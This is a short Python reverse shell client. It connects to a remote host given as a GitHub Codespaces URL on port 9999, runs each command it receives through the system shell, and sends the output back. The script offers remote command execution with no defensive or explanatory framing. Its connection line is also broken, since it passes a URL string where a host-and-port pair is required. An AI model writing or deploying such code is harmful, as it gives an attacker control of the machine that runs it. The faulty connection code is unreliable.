import socket
import subprocess

# Connect to the server
server_ip = 'https://fuzzy-succotash-r4pr45rvv9wv3pqp-9999.app.github.dev/'  # Change to your server's IP address

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip))

while True:
    command = client.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    client.send(output.stdout.encode() + output.stderr.encode())

client.close()
